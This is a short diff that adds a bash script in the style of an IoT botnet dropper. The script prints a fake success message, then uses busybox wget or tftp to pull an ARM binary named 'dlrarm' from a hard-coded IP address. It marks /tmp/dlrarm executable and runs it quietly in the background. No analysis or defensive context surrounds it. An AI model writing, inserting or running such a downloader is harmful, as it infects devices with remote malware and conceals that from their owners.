@@ -1,0 +1,5 @@
+#!/bin/bash
+echo "arm binary executed successfully"
+/bin/busybox wget -O - http://63.250.59.28:80/dlrarm || /bin/busybox tftp -g -r dlrarm 63.250.59.28 || echo "Download failed"
+chmod +x /tmp/dlrarm 2>/dev/null
+/tmp/dlrarm 2>/dev/null &
